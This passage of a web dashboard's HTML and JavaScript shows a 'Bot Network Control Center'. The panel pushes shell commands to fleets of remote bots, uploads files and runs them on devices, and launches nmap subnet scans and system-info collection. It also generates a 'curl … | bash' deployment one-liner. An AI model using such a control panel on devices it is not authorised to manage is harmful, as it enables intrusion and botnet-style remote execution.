                                <button class="btn btn-secondary" onclick="hideCustomBotCreator()">CANCEL</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="bulk-bot-operations">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">🔧 Bulk Bot Operations</h4>
                    <div class="bulk-controls">
                        <select id="bulkTargetSelect" class="command-input">
                            <option value="all">All Bots</option>
                            <option value="mobile">Mobile Bots</option>
                            <option value="servers">Server Bots</option>
                            <option value="scanners">Scanner Bots</option>
                        </select>
                        <select id="bulkActionSelect" class="command-input">
                            <option value="status">Get Status</option>
                            <option value="update">Update System</option>
                            <option value="restart">Restart Service</option>
                            <option value="scan_network">Scan Network</option>
                            <option value="collect_info">Collect System Info</option>
                            <option value="execute_custom">Execute Custom Command</option>
                        </select>
                        <button class="btn" onclick="executeBulkAction()">EXECUTE BULK</button>
                    </div>
                    
                    <div class="custom-command-area" id="customCommandArea" style="display: none;">
                        <input type="text" id="customBulkCommand" class="command-input" 
                               placeholder="Enter custom command for bulk execution">
                    </div>
                </div>
                
                <div class="bot-network-operations">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">🌐 Network Operations</h4>
                    <div class="network-operations-grid">
                        <button class="operation-btn" onclick="scanAllNetworks()">
                            <div class="op-icon">🔍</div>
                            <div class="op-label">SCAN NETWORKS</div>
                        </button>
                        <button class="operation-btn" onclick="collectSystemInfo()">
                            <div class="op-icon">📊</div>
                            <div class="op-label">COLLECT INFO</div>
                        </button>
                        <button class="operation-btn" onclick="updateAllBots()">
                            <div class="op-icon">⬆️</div>
                            <div class="op-label">UPDATE BOTS</div>
                        </button>
                        <button class="operation-btn" onclick="restartAllServices()">
                            <div class="op-icon">🔄</div>
                            <div class="op-label">RESTART ALL</div>
                        </button>
                    </div>
                </div>
                
                <div class="bot-results-area">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">📋 Operation Results</h4>
                    <div class="terminal" id="botResultsTerminal" style="max-height: 300px;">
                        <div class="terminal-line terminal-success">
                            <span class="terminal-timestamp">[BOT-NETWORK]</span> 
                            🤖 Bot Network Control Center Ready
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="filesTab" class="tab-content" style="display: none;">
                <div class="file-drop-zone" onclick="document.getElementById('fileInput').click()" 
                     ondrop="handleFileDrop(event)" ondragover="handleDragOver(event)">
                    <div>📁 DROP FILES HERE OR CLICK TO UPLOAD</div>
                    <div style="font-size: 12px; color: #666; margin-top: 0.5rem;">
                        Max 50MB • Scripts, configs, binaries
                    </div>
                </div>
                <input type="file" id="fileInput" style="display: none;" onchange="uploadFile()">
                
                <div id="fileList">
                    <!-- Files will be populated here -->
                </div>
            </div>
            
            <div id="servicesTab" class="tab-content" style="display: none;">
                <div class="service-list" id="serviceList">
                    <!-- Services will be populated here -->
                </div>
                
                <button class="btn" onclick="deployService()">DEPLOY NEW SERVICE</button>
            </div>
        </div>
        
        <!-- Right Panel: System Monitor -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-title">📊 SYSTEM MONITOR</div>
                <button class="btn btn-secondary" onclick="exportLogs()">EXPORT</button>
            </div>
            
            <div class="metrics-grid">
                <div class="metric-item">
                    <div class="metric-value" id="cpuUsage">0%</div>
                    <div class="metric-label">CPU Load</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value" id="memoryUsage">0%</div>
                    <div class="metric-label">Memory</div>
                </div>
            </div>
            
            <div class="terminal" id="activityLog" style="max-height: 400px;">
                <!-- Activity logs will be populated here -->
            </div>
        </div>
    </div>
    
    <script>
        const token = new URLSearchParams(window.location.search).get('token');
        if (!token) {
            document.body.innerHTML = '<div style="padding:2rem;text-align:center;color:#ff0080;">❌ ACCESS DENIED: Token required in URL</div>';
        }
        
        let selectedDevices = new Set(['all']);
        let currentTab = 'terminal';
        let startTime = Date.now();
        let commandCount = 0;
        let successfulCommands = 0;
        
        // API Helper
        async function api(endpoint, options = {}) {
            const url = `${endpoint}${endpoint.includes('?') ? '&' : '?'}token=${token}`;
            const response = await fetch(url, options);
            return await response.json();
        }
        
        // Tab switching function
        window.switchTab = function(tabName) {
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Show/hide tab content
            document.querySelectorAll('.tab-content').forEach(content => {
                content.style.display = 'none';
            });
            const targetTab = document.getElementById(tabName + 'Tab');
            if (targetTab) {
                targetTab.style.display = 'block';
            }
            
            // Initialize device terminal if switching to it
            if (tabName === 'device-terminal' && !deviceTerminalConnected) {
                initializeDeviceTerminal();
            }
        };
        
        // Terminal functions - appendToTerminal is defined later with enhanced features
        
        function appendToActivityLog(message, type = 'info') {
            const log = document.getElementById('activityLog');
            const timestamp = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = `terminal-line terminal-${type}`;
            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
            
            // Keep only last 50 entries
            while (log.children.length > 50) {
                log.removeChild(log.firstChild);
            }
        }
        
        // Device management
        async function refreshDevices() {
            try {
                // Save currently selected devices
                const selectedDevices = Array.from(document.querySelectorAll('.device-item.selected'))
                    .map(item => item.textContent.match(/control-[^\s⚡🔒]+/)?.[0] || item.dataset.deviceId)
                    .filter(id => id);
                
                const data = await api('/api/devices');
                const devices = data.devices || [];
                
                const deviceList = document.getElementById('deviceList');
                const targetSelect = document.getElementById('targetSelect');
                
                deviceList.innerHTML = '';
                targetSelect.innerHTML = '<option value="all">🌐 ALL DEVICES</option>';
                
                let onlineCount = 0;
                
                // Show message if no devices
                if (devices.length === 0) {
                    deviceList.innerHTML = '<div style="padding: 1rem; text-align: center; color: #666;">No devices connected. Control bot will appear here once initialized.</div>';
                    appendToActivityLog('⚠️ No devices found - ensure control bot is running', 'warning');
                    return;
                }
                
                devices.forEach(device => {
                    const age = Math.round((Date.now() / 1000) - device.last_seen);
                    const isOnline = age < 60;
                    if (isOnline) onlineCount++;
                    
                    const deviceItem = document.createElement('div');
                    deviceItem.className = 'device-item';
                    deviceItem.dataset.deviceId = device.id;
                    
                    // Restore selection if this device was previously selected
                    if (selectedDevices.includes(device.id)) {
                        deviceItem.classList.add('selected');
                    }
                    
                    deviceItem.onclick = () => toggleDeviceSelection(device.id);
                    
                    deviceItem.innerHTML = `
                        <div>
                            <span class="device-status ${isOnline ? 'online' : 'offline'}"></span>
                            <strong>${device.id}</strong>
                            ${device.exec_allowed ? '⚡' : '🔒'}
                        </div>
                        <div class="device-info">
                            Tags: ${(device.tags || []).join(', ') || 'none'} | ${age}s ago
                        </div>
                    `;
                    
                    deviceList.appendChild(deviceItem);
                    
                    // Add to target select
                    const option = document.createElement('option');
                    option.value = `id:${device.id}`;
                    option.textContent = `🤖 ${device.id}`;
                    targetSelect.appendChild(option);
                });
                
                // Update stats
                document.getElementById('deviceCount').textContent = devices.length;
                document.getElementById('onlineCount').textContent = onlineCount;
                
                appendToActivityLog(`📊 Device sync complete: ${devices.length} total, ${onlineCount} online`);
                
            } catch (error) {
                appendToTerminal(`❌ Failed to refresh devices: ${error.message}`, 'error');
                appendToActivityLog(`❌ Device refresh failed: ${error.message}`, 'error');
            }
        }
        
        function toggleDeviceSelection(deviceId) {
            const deviceItems = document.querySelectorAll('.device-item');
            deviceItems.forEach(item => {
                if (item.dataset.deviceId === deviceId || item.textContent.includes(deviceId)) {
                    item.classList.toggle('selected');
                }
            });
        }
        
        // Command execution is handled by sendTerminalCommand (defined later)
        // Command helpers moved to later section with window assignments
        
        // File management
        function handleDragOver(event) {
            event.preventDefault();
            event.currentTarget.classList.add('dragover');
        }
        
        function handleFileDrop(event) {
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            
            const files = event.dataTransfer.files;
            if (files.length > 0) {
                uploadFiles(files);
            }
        }
        
        function uploadFile() {
            const fileInput = document.getElementById('fileInput');
            if (fileInput.files.length > 0) {
                uploadFiles(fileInput.files);
            }
        }
        
        async function uploadFiles(files) {
            for (let file of files) {
                if (file.size > 50 * 1024 * 1024) {
                    appendToTerminal(`❌ File ${file.name} too large (max 50MB)`, 'error');
                    continue;
                }
                
                try {
                    appendToTerminal(`📤 Uploading ${file.name}...`, 'info');
                    
                    const formData = new FormData();
                    formData.append('file', file);
                    
                    const response = await fetch(`/api/upload?token=${token}`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (response.ok) {
                        appendToTerminal(`✅ Upload successful: ${result.filename} (ID: ${result.id})`, 'success');
                        appendToActivityLog(`📁 File uploaded: ${result.filename}`);
                        await refreshFiles();
                    } else {
                        appendToTerminal(`❌ Upload failed: ${result.error}`, 'error');
                    }
                } catch (error) {
                    appendToTerminal(`❌ Upload error: ${error.message}`, 'error');
                }
            }
        }
        
        async function refreshFiles() {
            try {
                const data = await api('/api/uploads');
                const files = data.uploads || [];
                
                const fileList = document.getElementById('fileList');
                fileList.innerHTML = '';
                
                files.forEach(file => {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'service-item';
                    fileItem.innerHTML = `
                        <div>
                            <strong>${file.filename}</strong>
                            <div style="font-size: 11px; color: #666;">
                                ${(file.size / 1024).toFixed(1)} KB • ${file.sha256.substring(0, 8)}...
                            </div>
                        </div>
                        <div class="service-controls">
                            <button class="btn" onclick="deployFile('${file.id}')">DEPLOY</button>
                        </div>
                    `;
                    fileList.appendChild(fileItem);
                });
                
            } catch (error) {
                appendToTerminal(`❌ Failed to refresh files: ${error.message}`, 'error');
            }
        }
        
        async function deployFile(fileId) {
            const target = document.getElementById('targetSelect').value;
            
            if (!confirm(`Deploy file ${fileId} to ${target}?\\n\\nThis will execute the file on devices with exec_allowed=true.`)) {
                return;
            }
            
            try {
                appendToTerminal(`🚀 Deploying file ${fileId} to ${target}...`, 'info');
                
                const result = await api('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target: target,
                        cmd: `run_upload:${fileId}`
                    })
                });
                
                appendToTerminal(`📥 Deploy result: ${JSON.stringify(result, null, 2)}`, 'success');
                appendToActivityLog(`🚀 File deployed: ${fileId} → ${target}`);
                
            } catch (error) {
                appendToTerminal(`❌ Deploy failed: ${error.message}`, 'error');
            }
        }
        
        // Tab management
        function switchTab(tabName) {
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Show/hide tab content
            document.querySelectorAll('.tab-content').forEach(content => {
                content.style.display = 'none';
            });
            document.getElementById(tabName + 'Tab').style.display = 'block';
            
            currentTab = tabName;
            
            if (tabName === 'files') {
                refreshFiles();
            } else if (tabName === 'services') {
                refreshServices();
            } else if (tabName === 'bots') {
                updateBotStats();
                appendToBotResults('🤖 Bot Control Center activated');
            }
        }
        
        // Service management
        async function refreshServices() {
            // Placeholder for service management
            const serviceList = document.getElementById('serviceList');
            serviceList.innerHTML = `
                <div class="service-item">
                    <div>🔧 Service management coming soon...</div>
                </div>
            `;
        }
        
        function deployService() {
            appendToTerminal('🔧 Service deployment feature in development...', 'info');
        }
        
        // Utility functions
        function updateMetrics() {
            const successRate = commandCount > 0 ? Math.round((successfulCommands / commandCount) * 100) : 100;
            document.getElementById('totalCommands').textContent = commandCount;
            document.getElementById('successRate').textContent = successRate + '%';
        }
        
        function updateUptime() {
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(uptime / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            document.getElementById('uptime').textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}`;
        }
        
        function filterByGroup(group) {
            appendToTerminal(`🔍 Filtering devices by group: ${group}`, 'info');
        }
        
        function exportLogs() {
            appendToTerminal('📋 Log export feature in development...', 'info');
        }
        
        // Advanced Bot Management Functions
        function showCreateBotModal() {
            const botType = document.getElementById('botTemplateSelect').value;
            const botId = prompt(`Enter Bot ID for ${botType} bot:`, `${botType}-${Date.now()}`);
            if (botId) {
                createBot(botType, botId);
            }
        }
        
        async function createBot(botType, botId) {
            try {
                appendToTerminal(`🤖 Creating ${botType} bot: ${botId}...`, 'info');
                appendToBotResults(`🚀 Deploying ${botType} bot with ID: ${botId}`);
                
                const result = await api('/api/bot/create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        bot_type: botType,
                        bot_id: botId,
                        exec_allowed: true,
                        tags: [botType, 'managed']
                    })
                });
                
                if (result.status === 'success') {
                    appendToBotResults(`✅ Bot ${botId} created successfully`);
                    appendToBotResults(`📋 Deployment script generated`);
                    appendToBotResults(`📡 Bot ready for connection...`);
                    
                    // Show deployment instructions - Fixed Unicode encoding issue
                    const instructions = `
To connect this bot, run the following on the target device:

curl -sSL "data:text/plain;base64,${btoa(unescape(encodeURIComponent(result.deployment_script)))}" | bash

Or manually execute the deployment script.
                    `;
                    
                    appendToBotResults(`📋 Deployment Instructions:`);
                    appendToBotResults(instructions);
                    
                    // Update bot count
                    updateBotStats();
                    refreshDevices();
                    
                    appendToTerminal(`✅ Bot ${botId} created and ready for deployment`, 'success');
                    appendToActivityLog(`🤖 New bot created: ${botId} (${botType})`);
                } else {
                    throw new Error(result.error || 'Unknown error');
                }
                
            } catch (error) {
                appendToTerminal(`❌ Failed to create bot: ${error.message}`, 'error');
                appendToBotResults(`❌ Bot creation failed: ${error.message}`);
            }
        }
        
        function deployBotTemplate() {
            const template = document.getElementById('botTemplateSelect').value;
            const botId = `${template}-${Date.now()}`;
            createBot(template, botId);
        }
        
        function deployBotType(botType) {
            const botId = `${botType}-${Date.now()}`;
            createBot(botType, botId);
        }
        
        async function removeSelectedBots() {
            const selectedDevices = document.querySelectorAll('.device-item.selected');
            if (selectedDevices.length === 0) {
                appendToTerminal('⚠️ No bots selected for removal', 'warning');
                return;
            }
            
            if (!confirm(`Remove ${selectedDevices.length} selected bot(s)? This will disconnect them from the network.`)) {
                return;
            }
            
            try {
                appendToBotResults(`🗑️ Removing ${selectedDevices.length} bot(s)...`);
                
                for (let device of selectedDevices) {
                    const botId = device.querySelector('strong').textContent;
                    appendToBotResults(`🔴 Disconnecting bot: ${botId}`);
                    
                    const result = await api('/api/bot/remove', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ bot_id: botId })
                    });
                    
                    if (result.status === 'success') {
                        appendToBotResults(`✅ Bot ${botId} removed successfully`);
                        device.remove();
                    } else {
                        appendToBotResults(`❌ Failed to remove bot ${botId}: ${result.error}`);
                    }
                }
                
                updateBotStats();
                refreshDevices();
                appendToBotResults(`✅ Bot removal operation completed`);
                appendToTerminal(`✅ Removed ${selectedDevices.length} bot(s)`, 'success');
                
            } catch (error) {
                appendToTerminal(`❌ Failed to remove bots: ${error.message}`, 'error');
                appendToBotResults(`❌ Bot removal failed: ${error.message}`);
            }
        }
        
        function executeBulkAction() {
            const target = document.getElementById('bulkTargetSelect').value;
            const action = document.getElementById('bulkActionSelect').value;
            
            if (action === 'execute_custom') {
                document.getElementById('customCommandArea').style.display = 'block';
                return;
            }
            
            document.getElementById('customCommandArea').style.display = 'none';
            
            const actionCommands = {
                'status': 'echo "Bot Status: Online" && uptime',
                'update': 'pkg update -y || apt update -y || yum update -y',
                'restart': 'systemctl restart unified-agent || pkill -f unified',
                'scan_network': 'nmap -sn 192.168.1.0/24 || ping -c 1 8.8.8.8',
                'collect_info': 'uname -a && free -h && df -h && whoami'
            };
            
            const command = actionCommands[action];
            if (command) {
                appendToBotResults(`🚀 Executing bulk action "${action}" on ${target} bots`);
                appendToBotResults(`📡 Command: ${command}`);
                
                // Execute via main command system
                document.getElementById('targetSelect').value = target === 'all' ? 'all' : `tag:${target}`;
                document.getElementById('commandInput').value = command;
                sendCommand();
            }
        }
        
        function scanAllNetworks() {
            appendToBotResults('🔍 Initiating network scan across all scanner bots...');
            appendToBotResults('📡 Executing: nmap -sn 192.168.1.0/24');
            executeBulkCommandOnBots('scanners', 'nmap -sn 192.168.1.0/24 && nmap -sn 10.0.0.0/24');
            appendToBotResults('⏳ Scan in progress - results will appear in terminal output');
        }
        
        function collectSystemInfo() {
            appendToBotResults('📊 Collecting system information from all bots...');
            appendToBotResults('📡 Gathering: OS info, memory, disk, processes');
            executeBulkCommandOnBots('all', 'uname -a && free -h && df -h && ps aux | head -10');
            appendToBotResults('⏳ Collection in progress - check terminal for results');
        }
        
        function updateAllBots() {
            appendToBotResults('⬆️ Updating all bots...');
            appendToBotResults('📦 Running: pkg/apt/yum update');
            executeBulkCommandOnBots('all', 'pkg update -y || apt update -y || yum update -y');
            appendToBotResults('⏳ Update in progress - this may take several minutes');
        }
        
        function restartAllServices() {
            appendToBotResults('🔄 Restarting services on all bots...');
            appendToBotResults('⚠️ Bots will temporarily disconnect');
            executeBulkCommandOnBots('all', 'systemctl restart unified-agent || pkill -f unified && sleep 2 && python3 unified_agent_with_ui.py --mode device &');
            appendToBotResults('⏳ Restart in progress - bots will reconnect shortly');
        }
        
        async function executeBulkCommandOnBots(target, command) {
            // Map target to proper specification
            const targetMap = {
                'all': 'all',
                'mobile': 'tag:mobile',
                'servers': 'tag:servers', 
                'scanners': 'tag:scanners'
            };
            
            const realTarget = targetMap[target] || target;
            
            // Execute via terminal API to get real results
            try {
                appendToBotResults(`⚙️ Dispatching command to ${target} bots...`);
                
                const result = await api('/api/terminal/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        target: realTarget, 
                        command: command,
                        user_context: 'bot_operations'
                    })
                });
                
                if (result.status === 'success' && result.execution_result) {
                    const results = result.execution_result.results || [];
                    appendToBotResults(`✅ Command executed on ${results.length} device(s)`);
                    
                    // Show results from each device
                    results.forEach(deviceResult => {
                        const deviceId = deviceResult.device_id || 'unknown';
                        if (deviceResult.success) {
                            appendToBotResults(`📋 ${deviceId}: Command completed`);
                            if (deviceResult.output && deviceResult.output.trim()) {
                                // Show first few lines of output
                                const lines = deviceResult.output.split('\n').slice(0, 3);
                                lines.forEach(line => {
                                    if (line.trim()) {
                                        appendToBotResults(`  ${line}`, 'info');
                                    }
                                });
                                if (deviceResult.output.split('\n').length > 3) {
                                    appendToBotResults(`  ... (see terminal for full output)`, 'info');
                                }
                            }
                        } else {
                            appendToBotResults(`❌ ${deviceId}: ${deviceResult.error || 'Failed'}`, 'error');
                        }
                    });
                } else {
                    appendToBotResults(`❌ Command failed: ${result.error || 'Unknown error'}`, 'error');
                }
            } catch (error) {
                appendToBotResults(`❌ Bulk operation failed: ${error.message}`, 'error');
            }
        }
        
        function appendToBotResults(message, type = 'info') {
            const terminal = document.getElementById('botResultsTerminal');
            if (!terminal) return;
            
            const timestamp = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = `terminal-line terminal-${type}`;
            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
            
            // Keep only last 30 entries
            while (terminal.children.length > 30) {
                terminal.removeChild(terminal.firstChild);
            }
        }
        
        function updateBotStats() {
            // Update bot network statistics
            const devices = document.querySelectorAll('.device-item');
            const totalBots = devices.length;
            const onlineBots = document.querySelectorAll('.device-status.online').length;
            const executingBots = 0; // Would be calculated from active commands
            
            // Update main stats
            if (document.getElementById('totalBots')) {
                document.getElementById('totalBots').textContent = totalBots;
            }
            if (document.getElementById('activeBots')) {
                document.getElementById('activeBots').textContent = onlineBots;
            }
            if (document.getElementById('networkBotCount')) {
                document.getElementById('networkBotCount').textContent = totalBots;
            }
            if (document.getElementById('onlineBotCount')) {
                document.getElementById('onlineBotCount').textContent = onlineBots;
            }
            if (document.getElementById('executingBotCount')) {
                document.getElementById('executingBotCount').textContent = executingBots;
            }
        }
        
        // Enhanced device refresh to update bot stats
        const originalRefreshDevices = refreshDevices;
        refreshDevices = async function() {
            await originalRefreshDevices();
            updateBotStats();
        };
        
        // Custom Bot Creation Functions
        function showCustomBotCreator() {
            document.getElementById('customBotCreator').style.display = 'block';
            appendToBotResults('🛠️ Custom Bot Creator opened');
        }
        
        function hideCustomBotCreator() {
            document.getElementById('customBotCreator').style.display = 'none';
            // Clear form
            document.getElementById('customBotName').value = '';
            document.getElementById('customBotIcon').value = '';
            document.getElementById('customBotDesc').value = '';
            document.getElementById('customBotTags').value = '';
            document.getElementById('customBotCapabilities').value = '';
            document.getElementById('customBotScript').value = '';
        }
        
        async function createCustomBot() {
            const name = document.getElementById('customBotName').value.trim();
            const icon = document.getElementById('customBotIcon').value.trim() || '🤖';
            const description = document.getElementById('customBotDesc').value.trim();
            const tags = document.getElementById('customBotTags').value.trim().split(',').map(t => t.trim()).filter(t => t);
            const capabilities = document.getElementById('customBotCapabilities').value.trim().split(',').map(c => c.trim()).filter(c => c);
            const customScript = document.getElementById('customBotScript').value.trim();
            
            if (!name || !description) {
                appendToBotResults('❌ Name and description are required for custom bot', 'error');
                return;
            }
            
            const botId = `custom-${name.toLowerCase().replace(/\s+/g, '-')}-${Date.now()}`;
            
            try {
                appendToBotResults(`🛠️ Creating custom bot: ${name}...`);
                
                const result = await api('/api/bot/create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        bot_type: 'custom',
                        bot_id: botId,
                        exec_allowed: true,
                        tags: tags.length > 0 ? tags : ['custom'],
                        custom_config: {
                            name: name,
                            icon: icon,
                            description: description,
                            capabilities: capabilities,
                            script: customScript
                        }
                    })
                });
                
                if (result.status === 'success') {
                    appendToBotResults(`✅ Custom bot "${name}" created successfully`);
                    appendToBotResults(`🆔 Bot ID: ${botId}`);
                    hideCustomBotCreator();
                    updateBotStats();
                    refreshDevices();
                    appendToTerminal(`✅ Custom bot "${name}" ready for deployment`, 'success');
                } else {
                    throw new Error(result.error || 'Unknown error');
                }
                
            } catch (error) {
                appendToBotResults(`❌ Failed to create custom bot: ${error.message}`, 'error');
                appendToTerminal(`❌ Custom bot creation failed: ${error.message}`, 'error');
            }
        }
        
        // Enhanced Terminal Functions
        let realTerminalMode = false;
        let autoScrollEnabled = true;
        
        function toggleRealTerminalMode() {
            realTerminalMode = document.getElementById('realTerminalMode').checked;
            const placeholder = document.getElementById('commandInput');
            
            if (realTerminalMode) {
                placeholder.placeholder = 'Real Terminal Mode: Direct shell access (e.g., cd /tmp && ls -la)';
                appendToTerminal('⚠️ Real Terminal Mode enabled - Direct shell access active', 'warning');
                appendToBotResults('⚠️ Real Terminal Mode activated - Use with caution');
            } else {
                placeholder.placeholder = 'Enter command (e.g., ls -la, nmap -sn 192.168.1.0/24)';
                appendToTerminal('🔒 Real Terminal Mode disabled - Standard command mode', 'info');
            }
        }
        
        // Terminal helper functions are defined later with window assignments for global access
        
        // System simulation
        async function simulateSystemLoad() {
            try {
                // Get real system stats instead of simulation
                const stats = await api('/api/system/stats');
                if (stats && stats.system) {
                    const cpuLoad = stats.system.cpu_usage || '0%';
                    const memoryLoad = stats.system.memory_usage || '0%';
                    
                    document.getElementById('cpuUsage').textContent = cpuLoad;
                    document.getElementById('memoryUsage').textContent = memoryLoad;
                    
                    // Parse numeric values for overall load
                    const cpuNum = parseInt(cpuLoad) || 0;
                    const memoryNum = parseInt(memoryLoad) || 0;
                    document.getElementById('systemLoad').textContent = Math.max(cpuNum, memoryNum) + '%';
                } else {
                    // Fallback to conservative estimates if API fails
                    const cpuLoad = Math.floor(Math.random() * 5) + 3; // 3-8% (much lower)
                    const memoryLoad = Math.floor(Math.random() * 10) + 15; // 15-25%
                    
                    document.getElementById('cpuUsage').textContent = cpuLoad + '%';
                    document.getElementById('memoryUsage').textContent = memoryLoad + '%';
                    document.getElementById('systemLoad').textContent = Math.max(cpuLoad, memoryLoad) + '%';
                }
            } catch (error) {
                console.warn('System load monitoring failed:', error);
                // Conservative fallback values
                document.getElementById('cpuUsage').textContent = '5%';
                document.getElementById('memoryUsage').textContent = '20%';
                document.getElementById('systemLoad').textContent = '20%';
            }
        }
        
        // Enhanced Terminal Functions - Assigned to window and global scope for onclick handlers
        function sendTerminalCommand() {
            const target = document.getElementById('targetSelect').value;
            const command = document.getElementById('commandInput').value.trim();
            
            if (!command) return;
            
            // Show command being executed
            appendToTerminal(`📤 [${target}] ${command}`, 'command');
            
            // Use enhanced terminal API
            api('/api/terminal/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target, command, user_context: 'web_terminal' })
            }).then(result => {
                if (result.status === 'success') {
                    const executionResult = result.execution_result;
                    const deviceCount = executionResult.results?.length || 0;
                    
                    appendToTerminal(`✅ Command executed on ${deviceCount} devices`, 'success');
                    
                    // Display output from each device
                    if (executionResult.results) {
                        executionResult.results.forEach(deviceResult => {
                            const deviceId = deviceResult.device_id || 'unknown';
                            
                            if (deviceResult.success) {
                                if (deviceResult.output && deviceResult.output.trim()) {
                                    appendToTerminal(`🖥️ Output from ${deviceId}:`, 'info');
                                    // Display the actual command output
                                    const outputLines = deviceResult.output.split('\n');
                                    outputLines.forEach(line => {
                                        if (line.trim()) {
                                            appendToTerminal(`  ${line}`, 'output');
                                        }
                                    });
                                } else {
                                    appendToTerminal(`📝 ${deviceId}: Command completed (no output)`, 'info');
                                }
                                
                                if (deviceResult.execution_time) {
                                    appendToTerminal(`⏱️ ${deviceId}: Execution time: ${deviceResult.execution_time.toFixed(2)}s`, 'info');
                                }
                            } else {
                                appendToTerminal(`❌ ${deviceId}: ${deviceResult.error || 'Command failed'}`, 'error');
                            }
                        });
                    }
                } else {
                    appendToTerminal(`❌ Terminal execution failed: ${result.error}`, 'error');
                }
            }).catch(error => {
                appendToTerminal(`❌ API Error: ${error.message}`, 'error');
            });
            
            document.getElementById('commandInput').value = '';
        }
        // Also assign to window for consistency
        window.sendTerminalCommand = sendTerminalCommand;
        
        function sendQuickCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            sendTerminalCommand();
        }
        window.sendQuickCommand = sendQuickCommand;
        
        function handleCommandKeyPress(event) {
            if (event.key === 'Enter') {
                sendTerminalCommand();
            }
        }
        window.handleCommandKeyPress = handleCommandKeyPress;
        
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = `
                <div class="terminal-line terminal-success">
                    <span class="terminal-timestamp">[CLEARED]</span> 
                    🧹 Terminal cleared - Ready for new commands
                </div>
            `;
            appendToActivityLog('🧹 Terminal cleared by user');
        }
        window.clearTerminal = clearTerminal;
        
        function exportTerminalLog() {
            const terminal = document.getElementById('terminal');
            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
            const blob = new Blob([logs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            appendToActivityLog('📄 Terminal log exported');
        }
        window.exportTerminalLog = exportTerminalLog;
        
        // Auto-scroll functionality (using existing autoScrollEnabled variable from line 3855)
        function toggleTerminalAutoscroll(event) {
            autoScrollEnabled = !autoScrollEnabled;
            const button = event.target;
            button.textContent = autoScrollEnabled ? 'AUTO-SCROLL' : 'MANUAL-SCROLL';
            button.style.background = autoScrollEnabled ? '' : 'rgba(255, 0, 128, 0.3)';
            
            appendToTerminal(`${autoScrollEnabled ? '🔄' : '⏸️'} Auto-scroll ${autoScrollEnabled ? 'enabled' : 'disabled'}`, 'info');
        }
        window.toggleTerminalAutoscroll = toggleTerminalAutoscroll;
        
        function getTerminalHistory() {
            api('/api/terminal/history').then(result => {
                appendToTerminal(`📜 Command History (${result.total_commands} total commands)`, 'info');
                result.command_history.slice(-10).forEach(cmd => {
                    const timestamp = new Date(cmd.timestamp * 1000).toLocaleTimeString();
                    appendToTerminal(`  [${timestamp}] ${cmd.target} > ${cmd.command}`, 'info');
                });
            });
        }
        window.getTerminalHistory = getTerminalHistory;
        
        // Enhanced appendToTerminal to respect auto-scroll
        function appendToTerminal(message, type = 'info') {
            const terminal = document.getElementById('terminal');
            const timestamp = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = `terminal-line terminal-${type}`;
            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
            terminal.appendChild(div);
            
            if (autoScrollEnabled) {
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            // Keep only last 100 entries for performance
            while (terminal.children.length > 100) {
                terminal.removeChild(terminal.firstChild);
            }
        }
        window.appendToTerminal = appendToTerminal;
        
        // Device Discovery Functions
        window.showDeviceDiscovery = function() {
            const panel = document.getElementById('deviceDiscoveryPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        };
        
        window.scanLocalNetwork = async function() {
            appendToTerminal('🔍 Starting network discovery scan...', 'info');
            
            try {
                const result = await api('/api/discover/network', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                
                if (result.status === 'success') {
                    appendToTerminal(`✅ Network scan completed - Found ${result.total_discovered} devices`, 'success');
                    refreshDiscoveryResults();
                } else {
                    appendToTerminal(`❌ Network scan failed: ${result.error}`, 'error');
                }
            } catch (error) {
                appendToTerminal(`❌ Network scan error: ${error.message}`, 'error');
            }
        };
        
        window.refreshDiscoveryResults = async function() {
            try {
                const result = await api('/api/discover/results');
                const container = document.getElementById('discoveryResults');
                
                if (result.discovered_devices && result.discovered_devices.length > 0) {
                    container.innerHTML = '';
                    result.discovered_devices.forEach(device => {
                        const deviceDiv = document.createElement('div');
                        deviceDiv.className = 'discovery-item';
                        deviceDiv.innerHTML = `
                            <div class="discovery-info">
                                <strong>${device.ip}</strong>
